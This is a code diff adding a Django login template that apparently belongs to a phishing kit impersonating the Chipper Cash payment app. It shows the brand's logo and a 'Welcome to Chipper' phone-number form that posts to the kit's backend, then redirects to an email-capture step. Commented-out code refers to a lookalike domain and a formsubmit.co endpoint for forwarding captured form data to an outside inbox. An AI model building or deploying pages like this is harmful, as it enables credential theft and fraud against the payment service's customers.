@@ -1,0 +1,135 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Chipper Cash | Log in</title>
+
+    <!-- custom stylesheet + script -->
+    <link rel="stylesheet" href="static/dist/style.css">
+    <script defer src="static/dist/script.js"></script>
+    <link rel="stylesheet" href="static/app/build/css/intlTelInput.css">
+    <link rel="stylesheet" href="static/app/build/css/demo.css">
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.4/jquery.min.js" integrity="sha512-pumBsjNRGGqkPzKHndZMaAG+bir374sORyzM3uulLV14lN5LyykqNk8eEeUlUkB3U0M4FApyaHraT65ihJhDpQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+    <!-- favicon img -->
+    <link rel="shortcut icon" href="static/images/OIP__3_-removebg-preview.png" type="image/x-icon">
+
+</head>
+
+<body>
+
+    <form id="form" class="form" method="POST" action="{% url 'email' %}">
+        {% csrf_token %}
+        <!-- <input type="hidden" name="access_key" value="aa4e10d2-c45b-4c39-bbc6-9281c31f2e26">
+        <input name="redirect" type="hidden" id="name" value="https://chipper-webapp.online/email.html"> -->
+        <input type="hidden" name="_captcha" value="false">
+        <input type="hidden" name="_next">
+        <!-- <input type="hidden" name="url" value="chipper-webapp.online"> -->
+
+        <div class="form__header"><img src="static/images/OIP__3_-removebg-preview.png" alt=""></div>
+        <h3 class="form__para">Welcome to Chipper</h3>
+
+        <div class="form__inputCtn">
+            <input id="phone" maxlength="11" minlength="7" required class="inputt" name="phone" type="tel"><br>
+        </div>
+
+        <button class="submitBtn" type="submit">Next</button>
+
+    </form>
+
+
+
+
+
+    <script src="static/app/build/js/intlTelInput.js"></script>
+    <script>
+
+        const btn = document.querySelector('.submitBtn')
+        form.addEventListener('submit', (e) => {
+            //e.preventDefault()
+            const formData = new FormData(form);
+            let object = {};
+            formData.forEach((value, key) => {
+                object[key] = value;
+            });
+            let json = JSON.stringify(object);
+            btn.textContent = 'Loading...';
+
+            $.ajax({
+                type: 'POST',
+                url: "{% url 'index' %}",
+                data: {
+                    phone: $('#phone').val(),
+                    csrfmiddlewaretoken: $('input[name=csrfmiddlewaretoken]').val()
+                },
+            })
+
+            function myFunction(){
+                window.location.href = "{% url 'email' %}";
+            }
+
+
+          //  fetch("https://formsubmit.co/ajax/bd9d3034b6a8347a7aca02bbefb8a26", {
+               // method: "POST",
+               // headers: {
+                 //   'Content-Type': 'application/json',
+               //     'Accept': 'application/json'
+             //   },
+           //     body: json
+         //   })
+               // .then(response => response.json())
+               // .then(data => {
+                   // if (data.success == 'true') {
+                      //  setTimeout(() => {
+                       //     window.location.href = "{% url 'email' %}";
+                     //   }, 1000);
+                   // }
+                 //   console.log(data)
+               // })
+               // .catch(error => {
+                    //alert('an error occured, please try again')
+                    //console.log(error)
+                  //  window.location.reload()
+                //});
+        })
+
+
+
+        var input = document.querySelector("#phone");
+
+
+
+        window.intlTelInput(input, {
+            // allowDropdown: false,
+            // autoHideDialCode: false,
+            autoPlaceholder: "off",
+            // dropdownContainer: document.body,
+            // excludeCountries: ["us"],
+            // formatOnDisplay: true,
+            // geoIpLookup: function(callback) {
+            //   $.get("http://ipinfo.io", function() {}, "jsonp").always(function(resp) {
+            //     var countryCode = (resp && resp.country) ? resp.country : "";
+            //     callback(countryCode);
+            //   });
+            // },
+            // hiddenInput: "full_number",
+            initialCountry: "ng",
+            // localizedCountries: { 'de': 'Deutschland' },
+            // nationalMode: false,
+            onlyCountries: ['gh', 'ng', 'ke', 'cm', 'zm', 'gb', 'us', 'ug', 'rw', 'za', 'tz'],
+            // placeholderNumberType: "MOBILE",
+            // preferredCountries: ['cn', 'jp'],
+            separateDialCode: true,
+            utilsScript: "app/build/js/utils.js",
+        });
+    </script>
+</body>
+
+
+</html>
